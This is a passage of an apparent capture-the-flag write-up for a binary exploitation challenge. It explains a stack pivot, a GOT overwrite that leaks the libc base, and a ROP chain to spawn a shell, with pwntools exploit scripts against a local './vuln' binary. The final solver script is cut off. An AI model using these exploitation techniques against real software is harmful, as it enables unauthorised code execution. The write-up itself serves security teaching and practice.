<p>Here we get to the point where we&#x27;re about to overwrite the <code>GOT</code> with fgets, but see something interesting. Since we&#x27;ve done multiple <code>leave</code>s, we&#x27;ve stack pivoted to the writable region. This on its own isn&#x27;t a huge deal, but since it&#x27;s so close to all the important addresses in the <code>GOT</code>, there&#x27;s a good chance that the stack usage for the call to <code>fgets</code> will clobber them.</p>
<figure><img src="/assets/gdb2.png" alt=""><figcaption><p>After <code>GOT</code> overwrite. The telescope view shows that the <code>GOT</code> is clobbered by the stack variables.</p></figcaption></figure>
<p>And clobber them it does!</p>
<p>So we need to be more careful about where <code>rsp</code> is. Fortunately most functions used in <code>main</code> don&#x27;t use that much stack space (except for <code>printf</code>, which we can skip), so as long as <code>rsp</code> is further along in the writable region, its stack usage won&#x27;t clobber anything. We can achieve this by using an extra <code>leave ; ret</code>.</p>
<p>Recall that after <code>leave ; ret</code>, <code>rsp</code> points to directly after the saved rbp and rip (due to popping), and since we want <code>rsp</code> at a higher address, we can place our own saved <code>rbp</code> and <code>rip</code> pairs at high addresses. Then for the initial <code>leave ; ret</code> (at the end of main), we set <code>rbp</code> to point to that pair, and <code>rip</code> to <code>leave ; ret</code>. That way we control <code>rbp</code> and <code>rip</code>, while also having <code>rsp</code> be far enough to prevent clobbering!</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="getting-libc-leak">Getting libc leak<a href="#getting-libc-leak" class="hash-link" aria-label="Direct link to Getting libc leak" title="Direct link to Getting libc leak">​</a></h4>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./vuln&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./libc.so.6&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leave_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">157</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">68</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">high_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404800</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">high_addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> overflow</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404080</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp,rip pair at high address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404000</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overflow</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdead</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">     </span><span class="token comment" style="color:#999988;font-style:italic"># blank for now!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">high_addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x90</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">leave_ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># strlen@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">printf </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fgets </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overwrite</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_leak </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;puts: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc_leak</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_leak </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;libc: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">address</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Applying this gives us the script above, which successfully leaks libc base. We overwrite <code>strlen@GOT</code> to <code>puts@PLT</code> (not <code>printf@PLT</code> because it uses a lot of stack space), and after we overwrite <code>GOT</code>, <code>strlen</code> gets called. The way it&#x27;s set up is that <code>buf -&gt; puts@GOT</code>, which is now <code>puts@PLT + 6</code>. But when <code>strlen</code> gets called, <code>puts</code> is called, which resolves <code>puts@GOT</code> in time for <code>buf</code> to now point to <code>puts@LIBC</code>, giving us a leak!</p>
<p>And we don&#x27;t have to worry about the return value being greater than <code>0x80</code>, because <code>puts</code> returns the number of bytes outputted, which would be <code>7</code> (<code>6</code> for the address, <code>1</code> for the newline).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-a-shell">Getting a shell<a href="#getting-a-shell" class="hash-link" aria-label="Direct link to Getting a shell" title="Direct link to Getting a shell">​</a></h3>
<p>From here getting a shell is trivial. Since we have libc, we can easily find all the gadgets we need, so all we need is to write another rop chain which calls <code>system(&quot;/bin/sh&quot;)</code>. In my rop chain I used <code>system</code>, which also uses a lot of stack space, so I made <code>rsp</code> point to a further up location again, but you could just use <code>execv</code> and not face this problem.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solver">Solver<a href="#solver" class="hash-link" aria-label="Direct link to Solver" title="Direct link to Solver">​</a></h3>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./vuln&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./libc.so.6&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> prompt</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> leak</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> prompt</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Data: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> leak</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># newline</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">got </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">new_rsp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> got</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x800</span><span class="token plain">     </span><span class="token comment" style="color:#999988;font-style:italic"># sufficiently large to not interfere with GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_switch </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new_rsp </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># address of final rop chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># also sufficiently large for system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new_rsp </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leave_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">157</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">68</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># fgets(rbp-0x80, 0x80, stdin) ; strlen(rbp-0x80) ; leave ; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># the idea of &quot;switching&quot; is 2 consecutive &quot;leave ; ret&quot; gadgets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># such that rbp is controlled to a value we want</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># as our gets_gadget and fgets_gadget relies on rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># AND also ensuring rsp is a sufficiently large address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># such that the stack activity in the writable section doesn&#x27;t interfere with GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># or cause a crash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># the first &quot;leave ; ret&quot; sets rbp to point to a pair of &quot;saved rbp | return address&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># stored at `addr_switchX`, and call it new_rbp | new_ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># and triggers a second &quot;leave ; ret&quot; to then pop new_rbp into rbp, and return to new_ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># the 2nd &quot;leave ; ret&quot; also sets rsp to `addr_switchX`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># which for our purposes is a sufficiently large address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rbp_rip </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> rbp</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rip</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rbp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">switch </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> rbp_rip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_switch</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> leave_ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># setup pivot to writable region</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" 